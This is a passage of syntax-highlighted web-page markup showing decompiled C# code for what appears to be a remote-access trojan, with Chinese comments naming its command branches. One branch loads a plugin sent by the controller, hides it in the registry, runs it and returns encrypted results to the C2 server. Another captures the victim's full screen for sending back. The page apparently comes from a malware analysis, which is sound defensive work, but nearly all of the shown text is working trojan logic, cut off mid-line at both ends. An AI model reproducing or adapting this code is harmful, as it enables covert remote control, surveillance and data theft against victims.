style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 启动插件（执行插件的start方法）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateCall</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">plugin</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 循环等待插件执行完成/连接断开</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">while</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">||</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateGet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">plugin</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Off</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">)))</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">Thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sleep</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 停止插件</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateSet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">plugin</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">off</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支6：ret - 加载插件并回传执行结果 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">ret</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">pluginData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[])</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GTV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">].</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">&#x3C;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">10</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">&#x26;&#x26;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">pl</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">1</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 提取并解压插件数据，写入注册表</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">].</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">></span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">10</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ms</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">skipLen</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ZIP</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">STV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">3</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">pl</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">0</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 加载插件并调用GT方法获取结果，加密后回传C2</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">plugin</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">RuntimeHelpers</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetObjectValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Plugin</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">A</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">));</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">pluginResult</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Conversions</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateGet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">plugin</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">GT</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">));</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">ret</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ENB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#C98A7D;--1:#B56959"> pluginResult</span><span style="--0:#666666;--1:#999999">)}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支7：CAP - 屏幕截图并回传（免重复截图） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">CAP</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 获取屏幕分辨率，创建位图（截图画布）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">screenWidth</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Screen</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PrimaryScreen</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Bounds</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Width</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">screenHeight</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Screen</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PrimaryScreen</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Bounds</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Height</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#5DA994;--1:#2E8F82">Bitmap</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">fullScreenshot</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Bitmap</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">screenWidth</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">screenHeight</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#5DA994;--1:#2E8F82">Graphics</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">g</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Graphics</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">FromImage</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">fullScreenshot</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 截取整个屏幕</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">g</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CopyFromScreen</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> 